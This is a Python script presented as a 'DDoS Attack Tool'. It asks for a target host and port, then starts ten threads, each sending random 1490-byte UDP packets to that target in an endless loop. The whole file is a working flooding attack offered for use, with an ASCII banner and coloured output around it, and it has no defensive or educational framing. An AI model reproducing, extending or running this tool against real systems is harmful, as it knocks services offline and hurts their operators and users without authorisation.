#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This code was written by Elliot V56
# GitHub: https://github.com/ElliotV56
# DDoS Attack Tool v2.0.0

import os
import time
import sys
import socket
import threading
import platform
import random
from colorama import Fore, init

# Initialize colorama
init()

system = platform.uname()[0]

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    YELLOW = '\033[93m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def title():
    if system == 'Linux':
        os.system("printf '\033]2;DDoS-Attack\a'")
    elif system == 'Windows':
        os.system("title DDoS-Attack")
    else:
        print("\nPlease run this program on Linux or Windows!\n")
        sys.exit()

def clear_screen():
    if system == 'Windows':
        os.system("cls")
    elif system == 'Linux':
        os.system("clear")
    else:
        print("\nPlease run this program on Linux or Windows!\n")
        sys.exit()

def show_banner():
    print(Colors.PURPLE + r"""
  _____  _____  _____  _____   _____  _____  _____ 
 |_____||_____||_____||_____| |_____||_____||_____|
""" + Colors.GREEN + r"""
▓█████▄ ▓█████▄  ▒█████   ██████ ▄▄▄     ▄▄▄█████▓
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ ▒████▄   ▓  ██▒ ▓▒
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   ▒██  ▀█▄ ▒ ▓██░ ▒░
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒░██▄▄▄▄██░ ▓██▓ ░ 
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒ ▓█   ▓██▒ ▒██▒ ░ 
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░ ▒ ░░   
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░  ▒   ▒▒ ░   ░    
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░    ░   ▒    ░      
   ░       ░        ░ ░        ░        ░  ░        
 ░       ░                                          
""" + Colors.PURPLE + """
╔══════════════════════════════════════════╗
║   This code was written by Elliot V56    ║
║   GitHub: https://github.com/ElliotV56   ║
╚══════════════════════════════════════════╝
""" + Colors.END)

def attack(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    while True:
        sock.sendto(bytes, (ip, port))
        print(f"{Fore.GREEN}[+] {Fore.WHITE}Sent packet to {Fore.RED}{ip}{Fore.WHITE}:{Fore.RED}{port}")

def main():
    title()
    clear_screen()
    show_banner()
    
    try:
        host = input(f"\n{Colors.BLUE}[?]{Colors.END} Enter target host: ")
        port = int(input(f"{Colors.BLUE}[?]{Colors.END} Enter target port: "))
        
        ip = socket.gethostbyname(host)
        
        print(f"\n{Colors.RED}════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.YELLOW}[*]{Colors.END} Target IP: {Colors.RED}{ip}{Colors.END}")
        print(f"{Colors.YELLOW}[*]{Colors.END} Target Port: {Colors.RED}{port}{Colors.END}")
        print(f"{Colors.RED}════════════════════════════════════════════{Colors.END}")
        
        time.sleep(2)
        clear_screen()
        show_banner()
        
        print(f"\n{Colors.YELLOW}[!]{Colors.END} Starting attack... (Press CTRL+C to stop)")
        
        threads = []
        for i in range(10):  # 10 threads
            t = threading.Thread(target=attack, args=(ip, port))
            t.daemon = True
            threads.append(t)
            t.start()
            
        # Keep main thread alive
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!]{Colors.END} Attack stopped by user")
        sys.exit()
    except Exception as e:
        print(f"\n{Colors.RED}[!]{Colors.END} Error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!]{Colors.END} Program terminated by user")
        sys.exit()
